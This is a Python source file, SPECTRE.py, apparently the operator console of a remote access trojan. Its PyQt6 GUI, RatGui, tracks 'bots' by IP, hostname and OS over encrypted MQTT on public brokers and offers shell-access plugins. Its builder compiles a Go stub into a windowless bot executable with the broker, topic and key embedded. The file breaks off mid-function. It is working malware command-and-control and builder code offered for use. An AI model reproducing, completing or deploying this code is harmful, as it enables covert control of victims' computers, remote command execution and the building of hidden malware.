# SPECTRE.py
import sys
import uuid
import os
import subprocess
import shutil
import tempfile
import traceback
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QPushButton, QTextEdit, QToolBar, QTableWidget, 
                             QTableWidgetItem, QMenu, QStatusBar, QDialog, 
                             QFormLayout, QLineEdit, QLabel, QComboBox, QCheckBox, QSpinBox)
from PyQt6.QtCore import Qt, QTimer, QDateTime, pyqtSignal, QObject, QThread, QPropertyAnimation, QEasingCurve, QRect, QUrl
from PyQt6.QtGui import QIcon
from PyQt6.QtMultimedia import QMediaPlayer, QAudioOutput
import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
import ujson as json
from plugins import load_plugins
from core.router import Router
from core.transport import Transport
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import time
import queue
import threading
import math

class MqttSignalHandler(QObject):
    message_received = pyqtSignal(dict)

class SettingsDialog(QDialog):
    def __init__(self, parent=None, history=[], topic='/commands/', encryption_key='1234', sound_enabled=True, sound_cooldown=60, logging_enabled=True, log_level='INFO', presence_verbose=False):
        super().__init__(parent)
        self.setWindowTitle('Settings')
        self.setStyleSheet("""
            QDialog { background-color: #1a1a1a; color: #00ff00; }
            QLineEdit, QComboBox { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QLabel { 
                color: #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
        """)
        layout = QFormLayout()
        self.broker_url = QComboBox()
        self.broker_url.setEditable(True)
        self.broker_url.addItems(history)
        self.broker_url.setCurrentText('broker.hivemq.com')
        self.broker_port = QLineEdit('1883')
        self.topic = QLineEdit(topic)
        self.api_token = QLineEdit()
        self.api_token.setPlaceholderText('API Token (optional for flespi)')
        self.encryption_key = QLineEdit(encryption_key)
        layout.addRow('Broker URL:', self.broker_url)
        layout.addRow('Broker Port:', self.broker_port)
        layout.addRow('Topic:', self.topic)
        layout.addRow('API Token:', self.api_token)
        layout.addRow('Encryption Key:', self.encryption_key)
        # Sound settings
        self.sound_enabled_cb = QCheckBox('Enable connect sound')
        self.sound_enabled_cb.setChecked(sound_enabled)
        self.sound_cooldown_sb = QSpinBox()
        self.sound_cooldown_sb.setRange(1, 3600)
        self.sound_cooldown_sb.setValue(int(sound_cooldown))
        layout.addRow(self.sound_enabled_cb)
        layout.addRow('Sound cooldown (seconds):', self.sound_cooldown_sb)
        # Logging settings
        self.logging_enabled_cb = QCheckBox('Enable GUI logging')
        self.logging_enabled_cb.setChecked(logging_enabled)
        self.log_level_cb = QComboBox()
        self.log_level_cb.addItems(['DEBUG', 'INFO', 'WARNING', 'ERROR'])
        self.log_level_cb.setCurrentText(log_level)
        layout.addRow(self.logging_enabled_cb)
        layout.addRow('Log level:', self.log_level_cb)
        # Presence verbose logging toggle
        self.presence_verbose_cb = QCheckBox('Verbose presence logging')
        self.presence_verbose_cb.setChecked(presence_verbose)
        layout.addRow(self.presence_verbose_cb)
        submit_button = QPushButton('Save')
        submit_button.clicked.connect(self.accept)
        layout.addWidget(submit_button)
        self.setLayout(layout)

class ServerDialog(QDialog):
    def __init__(self, title, parent=None, topic='/commands/', default_key='1234'):
        super().__init__(parent)
        self.setWindowTitle(title)
        self.setStyleSheet("""
            QDialog { background-color: #1a1a1a; color: #00ff00; }
            QLineEdit, QComboBox { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QLabel { 
                color: #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
        """)
        layout = QFormLayout()
        self.bot_name = QLineEdit('server')
        self.bot_id = QLabel(str(uuid.uuid4()))
        self.broker_url = QComboBox()
        self.broker_url.setEditable(True)
        self.broker_url.addItems(['broker.hivemq.com', 'mqtt.flespi.io'])
        self.broker_url.setCurrentText('broker.hivemq.com')
        self.api_token = QLineEdit()
        self.api_token.setPlaceholderText('API Token (optional for flespi)')
        self.encryption_key = QLineEdit(default_key)
        self.topic = QLineEdit(topic)
        layout.addRow('Bot Name:', self.bot_name)
        layout.addRow('Bot ID:', self.bot_id)
        layout.addRow('Broker URL:', self.broker_url)
        layout.addRow('Topic:', self.topic)
        layout.addRow('API Token:', self.api_token)
        layout.addRow('Encryption Key:', self.encryption_key)
        submit_button = QPushButton('Create')
        submit_button.clicked.connect(self.accept)
        layout.addWidget(submit_button)
        self.setLayout(layout)

    def get_server_info(self):
        return {
            'name': self.bot_name.text(),
            'id': self.bot_id.text(),
            'broker_url': self.broker_url.currentText(),
            'topic': self.topic.text(),
            'api_token': self.api_token.text().replace("'", "\\'").replace('"', '\\"'),
            'key': self.encryption_key.text(),
            'broker_port': 1883
        }

class ServerGeneratorThread(QThread):
    finished = pyqtSignal(str)

    def __init__(self, server_info, parent=None):
        super().__init__(parent)
        self.server_info = server_info

    def run(self):
        try:
            stub_path = os.path.join(os.getcwd(), 'SPECTRE_Stub.go')
            with open(stub_path, 'r') as f:
                bot_code = f.read()

            bot_code = bot_code.replace('{BROKER_URL}', self.server_info['broker_url'])
            bot_code = bot_code.replace('{BROKER_PORT}', str(self.server_info['broker_port']))
            bot_code = bot_code.replace('{TOPIC}', self.server_info['topic'])
            bot_code = bot_code.replace('{BOT_ID}', self.server_info['id'])
            bot_code = bot_code.replace('{API_TOKEN}', self.server_info['api_token'] if self.server_info['broker_url'] == 'mqtt.flespi.io' else '')
            bot_code = bot_code.replace('{ENCRYPTION_KEY}', self.server_info['key'])

            temp_dir = tempfile.mkdtemp()
            try:
                go_filename = os.path.join(temp_dir, f"{self.server_info['name']}.go")
                with open(go_filename, "w") as f:
                    f.write(bot_code)

                original_dir = os.getcwd()
                os.chdir(temp_dir)

                cmd_init = ["go", "mod", "init", "spectre"]
                result_init = subprocess.run(cmd_init, capture_output=True, text=True, timeout=60)
                if result_init.returncode != 0:
                    self.finished.emit(f"Error initializing Go module: {result_init.stderr}")
                    return

                cmd_tidy = ["go", "mod", "tidy"]
                try:
                    result_tidy = subprocess.run(cmd_tidy, capture_output=True, text=True, timeout=60)
                    if result_tidy.returncode == 0:
                        self.finished.emit("Fetched Go dependencies successfully")
                    else:
                        self.finished.emit(f"Error fetching Go dependencies: {result_tidy.stderr}")
                        return
                except subprocess.TimeoutExpired:
                    self.finished.emit("Error: 'go mod tidy' timed out after 60 seconds. Check network connectivity or GOPROXY settings.")
                    return

                cmd_vendor = ["go", "mod", "vendor"]
                try:
                    result_vendor = subprocess.run(cmd_vendor, capture_output=True, text=True, timeout=60)
                    if result_vendor.returncode == 0:
                        self.finished.emit("Vendored Go dependencies successfully")
                    else:
                        self.finished.emit(f"Error vendoring Go dependencies: {result_vendor.stderr}")
                        return
                except subprocess.TimeoutExpired:
                    self.finished.emit("Error: 'go mod vendor' timed out after 60 seconds. Check network connectivity or GOPROXY settings.")
                    return

                for file_name in ['go.mod']:
                    src_file = os.path.join(temp_dir, file_name)
                    if os.path.exists(src_file):
                        dst_file = os.path.join(original_dir, file_name)
                        shutil.copy(src_file, dst_file)
                        self.finished.emit(f"Copied {file_name} to: {dst_file}")
                    else:
                        self.finished.emit(f"Warning: {file_name} not found in temp directory")

                src_vendor = os.path.join(temp_dir, 'vendor')
                if os.path.exists(src_vendor):
                    dst_vendor = os.path.join(original_dir, 'vendor')
                    if os.path.exists(dst_vendor):
                        shutil.rmtree(dst_vendor)
                    shutil.copytree(src_vendor, dst_vendor)
                    self.finished.emit(f"Copied vendor directory to: {dst_vendor}")
                else:
                    self.finished.emit("Warning: vendor directory not found in temp directory")

                exe_filename = f"{self.server_info['name']}.exe" if sys.platform == "win32" else self.server_info['name']
                cmd_build = ["go", "build", "-mod=vendor", "-ldflags", "-H windowsgui", "-o", exe_filename, go_filename]
                result_build = subprocess.run(cmd_build, capture_output=True, text=True, timeout=60)
                if result_build.returncode != 0:
                    self.finished.emit(f"Error building Go executable: {result_build.stderr}")
                    return

                os.chdir(original_dir)
                final_go_filename = f"{self.server_info['name']}.go"
                shutil.copy(go_filename, final_go_filename)
                self.finished.emit(f"Copied Go source file to: {final_go_filename}")

                final_exe_filename = os.path.join(original_dir, exe_filename)
                shutil.move(os.path.join(temp_dir, exe_filename), final_exe_filename)
                self.finished.emit(f"Built executable: {final_exe_filename}")

            finally:
                os.chdir(original_dir)
                shutil.rmtree(temp_dir, ignore_errors=True)

        except FileNotFoundError as e:
            self.finished.emit(f"Error: SPECTRE_Stub.go template not found: {e}")
        except Exception as e:
            self.finished.emit(f"Error generating bot script: {e}")

class RatGui(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('SPECTRE')
        self.setMinimumSize(1200, 500)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a1a; color: #00ff00; }
            QTableWidget { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                gridline-color: #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
            QTextEdit { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QToolBar { background-color: #2a2a2a; border: 1px solid #00ff00; }
            QStatusBar { background-color: #2a2a2a; color: #00ff00; }
            QLineEdit {
                background-color: #2a2a2a;
                color: #00ff00;
                border: 2px solid #00ff00;
                font-family: 'Courier New';
                font-size: 12px;
            }
            QLabel#tipsLabel {
                color: #00ff00;
                font-family: 'Courier New';
                font-size: 12px;
                padding: 5px;
            }
        """)

        self.device_table_updates = []
        self.log_buffer = []
        self.device_table_changed = False
        self.add_bots = False
        self.remove_bots = False
        self.all_bots = []
        self.ui_update_timer = QTimer()
        self.ui_update_timer.timeout.connect(self.flush_ui_updates)
        self.ui_update_timer.start(1000)

        self.audio_output = QAudioOutput()
        self.media_player = QMediaPlayer()
        self.media_player.setAudioOutput(self.audio_output)
        self.media_player.setSource(QUrl.fromLocalFile("audio\\notification.wav"))
        self.last_sound_time = 0
        self.connect_count = 0
        self.sound_window = 1.0
        # sound settings (can be toggled in SettingsDialog)
        self.sound_enabled = True
        self.sound_cooldown = 60  # seconds per-device cooldown for connect beep
        # global beep burst limiter
        self._beep_recent_count = 0
        self._beep_window_start = time.time()
        # logging controls
        self.logging_enabled = True
        self.log_level = 'INFO'
        import logging
        logging.getLogger().setLevel(logging.INFO)

        try:
            icon_path = os.path.join('icon', 'icon.ico')
            if os.path.exists(icon_path):
                self.setWindowIcon(QIcon(icon_path))
            else:
                self.log_area = QTextEdit()
                self.log_area.append(f"Icon file not found at {icon_path}")
        except Exception as e:
            self.log_area = QTextEdit()
            self.log_area.append(f"Error setting window icon: {e}")

        self.device_status = {}
        self.connected_bots_count = 0
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage('0 connected')

        self.toolbar = QToolBar('Server Actions')
        self.addToolBar(Qt.ToolBarArea.TopToolBarArea, self.toolbar)
        self.create_server_button = QPushButton('Create Server')
        self.create_server_button.clicked.connect(self.create_server)
        self.toolbar.addWidget(self.create_server_button)
        settings_button = QPushButton('Settings')
        settings_button.clicked.connect(self.open_settings)
        self.toolbar.addWidget(settings_button)
        self.toolbar.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.toolbar.customContextMenuRequested.connect(self.show_context_menu)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        self.search_bar = QLineEdit()
        self.search_bar.setPlaceholderText("Search bots by IP, Host Name, or OS...")
        main_layout.addWidget(self.search_bar)
        self.search_bar.textChanged.connect(self.filter_bots)

        # Use a QTableView backed by DeviceTableModel for scalability
        from PyQt6.QtWidgets import QTableView
        from core.device_model import DeviceTableModel, DeviceTableShim

        self.device_model = DeviceTableModel(self)
        # underlying view used for rendering and selection
        self.device_view = QTableView()
        self.device_view.setModel(self.device_model)
        self.device_view.setMinimumHeight(350)
        self.device_view.setColumnHidden(5, True)  # hide Bot ID column
        self.device_view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.device_view.customContextMenuRequested.connect(self.show_context_menu)
        self.device_view.setSortingEnabled(True)
        self.device_view.verticalHeader().setVisible(False)
        self.device_view.horizontalHeader().setStretchLastSection(True)
        # compatibility shim for older plugins expecting QTableWidget-like API
        self.device_table = DeviceTableShim(self.device_view, self.device_model)
        main_layout.addWidget(self.device_view)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setMinimumHeight(100)
        self.log_area.append('Initialized SPECTRE with MQTT.')
        self.log_area.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.log_area.customContextMenuRequested.connect(self.show_log_context_menu)
        main_layout.addWidget(self.log_area)

        self.tips_label = QLabel()
        self.tips_label.setObjectName("tipsLabel")
        self.tips_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.tips = [
            "In Shell Access, type commands like 'dir' to list files or 'cd folder' to navigate.",
            "Right-click on a bot in the device table to access plugins like Shell Access or Send Message.",
            "Use the 'Create Server' button to generate a new bot executable."
        ]
        self.current_tip_index = 0
        self.tips_label.setText(self.tips[self.current_tip_index])
        self.tips_label.setMinimumWidth(600)
        main_layout.addWidget(self.tips_label)

        self.tips_timer = QTimer()
        self.tips_timer.timeout.connect(self.update_tip)
        self.tips_timer.start(10000)
        self.tips_animation = QPropertyAnimation(self.tips_label, b"geometry")
        self.tips_animation.setDuration(2000)
        self.tips_animation.setEasingCurve(QEasingCurve.Type.InOutQuad)

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_device_status)
        self.timer.start(10000)

        self.client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5, client_id=f"spectre_gui_{uuid.uuid4()}")
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.client.on_disconnect = self.on_disconnect
        self.client.on_log = self.on_log
        self.client.reconnect_delay_set(min_delay=1, max_delay=120)

        # Transport wrapper (used by plugins to send commands)
        try:
            self.transport = Transport(self)
        except Exception as e:
            self.log_buffered(f"Error creating transport: {e}")

        self.signal_handler = MqttSignalHandler()
        self.signal_handler.message_received.connect(self.handle_message)

        self.broker_url = 'broker.hivemq.com'
        self.broker_port = 1883
        self.topic = '/commands/'
        self.broker_history = ['broker.hivemq.com', 'mqtt.flespi.io']
        self.encryption_key = '1234'
        self.plugins = load_plugins(self)
        # Activate plugins (optional hook) and build message router
        for plugin in self.plugins:
            try:
                if hasattr(plugin, 'activate') and callable(plugin.activate):
                    plugin.activate()
            except Exception as e:
                self.log_buffered(f"Error activating plugin {getattr(plugin,'name',str(plugin))}: {e}")
        try:
            self.router = Router(self.plugins)
        except Exception as e:
            self.log_buffered(f"Error creating plugin router: {e}")
        self.is_connected = False

        self.data_dir = 'data'
        if not os.path.exists(self.data_dir):
            os.makedirs(self.data_dir)
        self.settings_file = os.path.join(self.data_dir, 'settings.json')
        self.json_file = os.path.join(self.data_dir, 'connections.json')
        self.load_settings()
        self.load_connections()
        self.connect_to_broker()

        # Presence manager: ensure each device receives a ping at least once per window
        # to reliably refresh their `last_beacon`. For large fleets we send pings in
        # small batches so each device is pinged within `presence_window` seconds.
        self.presence_window = 30  # seconds to consider a device alive without a response
        # Verbose presence logging (shows pings/sec and last_beacon refresh counts)
        self.presence_verbose = False
        self._presence_log_last = time.time()
        self._presence_pings_sent = 0
        self.presence_timer = QTimer()
        self.presence_timer.timeout.connect(self._presence_tick)
        self.presence_timer.start(1000)  # tick every second
        self._presence_index = 0

        self.message_queue = queue.Queue()
        self.message_thread = threading.Thread(target=self.process_messages)
        self.message_thread.daemon = True
        self.message_thread.start()

    def queue_message(self, data):
        self.message_queue.put(data)

    def process_messages(self):
        while True:
            try:
                message = self.message_queue.get(timeout=1.0)
                self.handle_message(message)
            except queue.Empty:
                continue
            time.sleep(0.02)

    def flush_ui_updates(self):
        if self.device_table_updates:
            # Each update is a simple data dict so all GUI operations happen here
            # Apply queued updates via the model (efficient and emits proper signals)
            for update in self.device_table_updates:
                # Ensure required keys
                if 'target' not in update:
                    ip = update.get('ip')
                    bot_id = update.get('id')
                    if ip and bot_id:
                        update['target'] = f"{ip}:{bot_id}"
                    else:
                        continue
                try:
                    action, row = self.device_model.update_or_insert(update)
                    # update device_status timestamp and handle per-device connect beep
                    status = update.get('status', 'Connected')
                    target = update.get('target')
                    prev = self.device_status.get(target)
                    prev_status = prev.get('status') if prev else 'Disconnected'
                    prev_last_beep = prev.get('last_beep') if prev else None
                    now_q = QDateTime.currentDateTime()
                    # set basic status and last_beacon, preserve last_beep (may be updated below)
                    self.device_status[target] = {
                        'status': status,
                        'last_beacon': now_q,
                        'last_beep': prev_last_beep
                    }

                    # If this device transitioned from not-connected to connected,
                    # consider playing the connect sound (respect per-device cooldown
                    # and a small global burst limiter to avoid massive simultaneous beeps)
                    if prev_status != 'Connected' and status == 'Connected':
                        try:
                            # Use centralized safe play routine which enforces per-device
                            # cooldown and a small global burst limiter.
                            self.safe_play_connect_sound(target)
                        except Exception:
                            pass
                except Exception as e:
                    self.log_buffered(f"Error applying device update: {e}")

            self.device_table_updates.clear()
            self.device_table_changed = True

        for log_message in self.log_buffer:
            self.log_area.append(log_message)
        self.log_buffer.clear()

        if (self.add_bots or self.remove_bots) and self.device_table_changed:
            self.save_connections()
            self.add_bots = False
            self.remove_bots = False
            self.device_table_changed = False

    def log_buffered(self, message):
        # Respect GUI logging setting; always allow ERROR level messages
        try:
            level = 'INFO'
            # Quick heuristic: if message contains 'Error' or 'Unhandled' treat as ERROR
            if any(k in message for k in ('Error', 'ERROR', 'Unhandled', 'Exception')):
                level = 'ERROR'
            if not getattr(self, 'logging_enabled', True) and level != 'ERROR':
                return
            # Apply level filter
            levels = {'DEBUG': 10, 'INFO': 20, 'WARNING': 30, 'ERROR': 40}
            current = levels.get(getattr(self, 'log_level', 'INFO'), 20)
            msg_level = levels.get(level, 20)
            if msg_level < current:
                return
            self.log_buffer.append(message)
        except Exception:
            try:
                self.log_buffer.append(message)
            except Exception:
                pass

    def play_connect_sound(self):
        current_time = time.time()
        # Backwards-compatible wrapper: route through centralized safe player
        self.safe_play_connect_sound()

    def safe_play_connect_sound(self, target=None):
        """Play the connect sound respecting per-device cooldown and a global
        burst limiter. If `target` is provided, update that device's
        `last_beep` timestamp in `device_status`.
        """
        try:
            if not getattr(self, 'sound_enabled', True):
                return
            now_ts = time.time()
            # reset global burst window every second
            if now_ts - self._beep_window_start >= 1.0:
                self._beep_window_start = now_ts
                self._beep_recent_count = 0

            # global burst limit (allow up to 5 beeps per second)
            if self._beep_recent_count >= 5:
                return

            # per-device cooldown
            if target:
                prev = self.device_status.get(target)
                prev_last_beep = None
                if prev:
                    prev_last_beep = prev.get('last_beep')
                last_beep_ts = 0
                if isinstance(prev_last_beep, QDateTime):
                    last_beep_ts = prev_last_beep.toSecsSinceEpoch()
                elif isinstance(prev_last_beep, (int, float)):
                    last_beep_ts = float(prev_last_beep)
                if last_beep_ts and (now_ts - last_beep_ts) < float(getattr(self, 'sound_cooldown', 60)):
                    return

            # play
            try:
                self.media_player.play()
            except Exception:
                return

            self._beep_recent_count += 1
            # update device last_beep if we have a target
            if target:
                try:
                    self.device_status.setdefault(target, {})
                    self.device_status[target]['last_beep'] = QDateTime.currentDateTime()
                except Exception:
                    pass
        except Exception:
            pass

    def update_tip(self):
        geom = self.tips_label.geometry()
        start_rect = QRect(geom.x(), geom.y(), geom.width(), geom.height())
        end_rect = QRect(-geom.width(), geom.y(), geom.width(), geom.height())
        self.tips_animation.setStartValue(start_rect)
        self.tips_animation.setEndValue(end_rect)
        self.tips_animation.start()
        
        QTimer.singleShot(2000, self.switch_tip)

    def switch_tip(self):
        self.current_tip_index = (self.current_tip_index + 1) % len(self.tips)
        self.tips_label.setText(self.tips[self.current_tip_index])
        geom = self.tips_label.geometry()
        start_rect = QRect(self.tips_label.parent().width(), geom.y(), geom.width(), geom.height())
        end_rect = QRect(0, geom.y(), geom.width(), geom.height())
        self.tips_animation.setStartValue(start_rect)
        self.tips_animation.setEndValue(end_rect)
        self.tips_animation.start()

    def load_settings(self):
        try:
            if os.path.exists(self.settings_file):
                with open(self.settings_file, 'r') as f:
                    settings = json.load(f)
                self.encryption_key = settings.get('encryption_key', '1234')
                self.broker_url = settings.get('broker_url', 'broker.hivemq.com')
                self.broker_port = int(settings.get('broker_port', 1883))
                self.topic = settings.get('topic', '/commands/')
                self.broker_history = settings.get('broker_history', ['broker.hivemq.com', 'mqtt.flespi.io'])
                # sound settings
                self.sound_enabled = settings.get('sound_enabled', True)
                self.sound_cooldown = int(settings.get('sound_cooldown', 60))
                # logging settings
                self.logging_enabled = settings.get('logging_enabled', True)
                self.log_level = settings.get('log_level', 'INFO')
                # presence verbose
                self.presence_verbose = settings.get('presence_verbose', False)
                import logging
                levels = {'DEBUG': 10, 'INFO': 20, 'WARNING': 30, 'ERROR': 40}
                logging.getLogger().setLevel(levels.get(self.log_level, 20))
                self.log_buffered(f"Loaded settings from {self.settings_file}")
            else:
                self.save_settings()
                self.log_buffered("No settings file found, created default settings")
        except Exception as e:
            self.log_buffered(f"Error loading settings: {e}")

    def save_settings(self):
        try:
            settings = {
                'encryption_key': self.encryption_key,
                'broker_url': self.broker_url,
                'broker_port': self.broker_port,
                'topic': self.topic,
                'broker_history': self.broker_history
            ,
                'sound_enabled': getattr(self, 'sound_enabled', True),
                'sound_cooldown': getattr(self, 'sound_cooldown', 60)
            ,
                'logging_enabled': getattr(self, 'logging_enabled', True),
                'log_level': getattr(self, 'log_level', 'INFO'),
                'presence_verbose': getattr(self, 'presence_verbose', False)
            }
            with open(self.settings_file, 'w') as f:
                json.dump(settings, f, indent=4)
            self.log_buffered(f"Saved settings to {self.settings_file}")
        except Exception as e:
            self.log_buffered(f"Error saving settings: {e}")

    def encrypt_message(self, message):
        key = self.encryption_key.encode('utf-8')
        if len(key) < 16:
            key = key.ljust(16, b'\0')
        elif len(key) > 16 and len(key) < 24:
            key = key.ljust(24, b'\0')
        elif len(key) > 24 and len(key) < 32:
            key = key.ljust(32, b'\0')
        else:
            key = key[:32]
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(message.encode('utf-8'))
        encrypted = nonce + ciphertext + tag
        encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')
        self.log_buffered(f"GUI Encrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
        return encrypted_b64

    def decrypt_message(self, encrypted_message):
        key = self.encryption_key.encode('utf-8')
        if len(key) < 16:
            key = key.ljust(16, b'\0')
        elif len(key) > 16 and len(key) < 24:
            key = key.ljust(24, b'\0')
        elif len(key) > 24 and len(key) < 32:
            key = key.ljust(32, b'\0')
        else:
            key = key[:32]
        try:
            encrypted_data = base64.b64decode(encrypted_message)
            self.log_buffered(f"GUI Decrypt: encrypted_data_len={len(encrypted_data)}")
            nonce = encrypted_data[:12]
            tag = encrypted_data[-16:]
            ciphertext = encrypted_data[12:-16]
            self.log_buffered(f"GUI Decrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode('utf-8')
        except Exception as e:
            self.log_buffered(f"Error decrypting message: {e}")
            return encrypted_message

    def filter_bots(self, text):
        try:
            text = text.lower()
            for row in range(self.device_model.device_count()):
                match = False
                device = self.device_model.device_at(row)
                if not device:
                    self.device_table.setRowHidden(row, True)
                    continue
                for key in ['ip', 'hostname', 'os']:
                    val = device.get(key, '')
                    if val and text in str(val).lower():
                        match = True
                        break
                self.device_table.setRowHidden(row, not match)
        except Exception as e:
            self.log_buffered(f"Error filtering bots: {e}")

    def load_connections(self):
        try:
            if os.path.exists(self.json_file):
                with open(self.json_file, 'r') as f:
                    bots = json.load(f)
                # Load into model for scalability
                self.all_bots = bots
                devices = []
                for bot_data in bots:
                    bot_id = bot_data['id']
                    ip = bot_data.get('ip', 'Unknown')
                    os_info = bot_data.get('os', 'Unknown')
                    hostname = bot_data.get('hostname', 'Unknown')
                    target = f"{ip}:{bot_id}"
                    devices.append({
                        'id': bot_id,
                        'ip': ip,
                        'hostname': hostname,
                        'os': os_info,
                        'status': 'Disconnected',
                        'last_ping': 'N/A',
                        'target': target
                    })
                    self.device_status[target] = {'status': 'Disconnected', 'last_beacon': QDateTime.currentDateTime()}
                try:
                    self.device_model.load_devices(devices)
                except Exception:
                    # Fallback: if model isn't present, try populating the view directly
                    pass
                self.log_buffered(f"Loaded {len(bots)} bots from {self.json_file}")
                self.update_connected_count()
            else:
                self.log_buffered("No connections JSON file found, starting fresh")
                self.status_bar.showMessage(f"{self.connected_bots_count} connected")
        except Exception as e:
            self.log_buffered(f"Error loading connections: {e}")

    def save_connections(self):
        try:
            with open(self.json_file, 'w') as f:
                json.dump(self.all_bots, f, indent=4)
            self.log_buffered(f"Saved {len(self.all_bots)} bots to {self.json_file}")
            self.update_connected_count()
        except Exception as e:
            self.log_buffered(f"Error saving connections: {e}")

    def connect_to_broker(self):
        try:
            self.client.connect(self.broker_url, self.broker_port, 120)
            self.client.loop_start()
            self.log_buffered(f"Connected to {self.broker_url}")
            self.is_connected = True
        except Exception as e:
            self.log_buffered(f"Error connecting to broker: {e}")
            self.is_connected = False

    def on_connect(self, client, userdata, flags, reason_code, properties=None):
        try:
            if reason_code == 0:
                client.publish(self.topic, payload=None, qos=1, retain=True)
                self.log_buffered(f"GUI cleared retained messages on topic {self.topic}")
                client.subscribe(self.topic, qos=1)
                # After a successful reconnect, flush any queued transport messages
                try:
                    if hasattr(self, 'transport') and hasattr(self.transport, 'flush_queued'):
                        flushed = self.transport.flush_queued()
                        if flushed:
                            self.log_buffered(f"Flushed {flushed} queued transport messages")
                except Exception as e:
                    self.log_buffered(f"Error flushing transport queue on connect: {e}")
                self.log_buffered("Connected to MQTT broker")
                self.status_bar.showMessage(f"{self.connected_bots_count} connected")
                self.is_connected = True
            else:
                self.log_buffered(f"GUI connection failed with code {reason_code}")
                self.status_bar.showMessage(f"{self.connected_bots_count} connected")
                self.is_connected = False
        except Exception as e:
            self.log_buffered(f"Error in on_connect: {e}")

    def on_disconnect(self, client, userdata, rc, properties=None, reason=None):
        try:
            self.log_buffered(f"GUI disconnected from MQTT broker with code {rc}")
            if reason:
                self.log_buffered(f"Disconnect reason: {reason}")
            self.status_bar.showMessage(f"{self.connected_bots_count} connected")
            self.is_connected = False
            self.client.loop_stop()
            self.connect_to_broker()
        except Exception as e:
            self.log_buffered(f"Error in on_disconnect: {e}")

    def on_log(self, client, userdata, level, buf):
        try:
            pass
        except Exception as e:
            print(f"Error in on_log: {e}")

    def on_message(self, client, userdata, msg, properties=None):
        try:
            message = msg.payload.decode('utf-8')
            if not message:
                self.log_buffered("GUI received empty message, ignoring")
                return
            try:
                decrypted_message = self.decrypt_message(message)
                data = json.loads(decrypted_message)
                if decrypted_message != message:
                    data['_encryption_status'] = 'encrypted'
                else:
                    data['_encryption_status'] = 'plaintext'
                self.signal_handler.message_received.emit(data)
            except json.JSONDecodeError:
                self.log_buffered(f"Error decoding message as JSON: {message}")
        except Exception as e:
            self.log_buffered(f"Error processing message: {e}")

    def handle_message(self, data):
        start_time = time.time()
        try:
            encryption_status = data.pop('_encryption_status', 'unknown')
            # Update last-beacon for any message that includes bot identity
            if 'id' in data and 'ip' in data:
                # connect messages are handled via queued UI updates so sound
                # playback goes through the main-thread cooldown logic in
                # `flush_ui_updates`. Avoid playing here which bypasses cooldowns.
                if data.get('type') == 'connect':
                    print(f"GUI processing connect message: {data}")
                # Enqueue a GUI-thread update record (flush_ui_updates will apply it)
                try:
                    self.queue_device_table_update(data)
                except Exception as e:
                    self.log_buffered(f"Error queueing device table update: {e}")
            # Dispatch message via router (will call plugin.handle_response)
            try:
                if hasattr(self, 'router'):
                    self.router.dispatch(data)
                else:
                    # Fallback: broadcast to all plugins
                    for plugin in self.plugins:
                        plugin.handle_response(data)
            except Exception as e:
                self.log_buffered(f"Error dispatching message via router: {e}")
            self.log_buffered(f"GUI received message on topic {self.topic}: {encryption_status} {json.dumps(data)}")
        except Exception as e:
            self.log_buffered(f"Error handling message: {e}")
        finally:
            end_time = time.time()
            self.log_buffered(f"Total message handling took {end_time - start_time:.2f} seconds")

    def queue_device_table_update(self, data):
        # Create a data-only update record. All GUI operations will be
        # performed in flush_ui_updates on the main thread.
        bot_id = data.get('id')
        ip = data.get('ip', 'Unknown')
        os_info = data.get('os', 'Unknown')
        hostname = data.get('hostname', 'Unknown')
        target = f"{ip}:{bot_id}"

        bot_data = {
            'id': bot_id,
            'ip': ip,
            'hostname': hostname,
            'os': os_info
        }

        # Track new bots list (data-only) for persistence; GUI insertion will happen later
        new_bot = not any(bot['id'] == bot_id and bot['ip'] == ip for bot in self.all_bots)
        if new_bot:
            self.all_bots.append(bot_data)
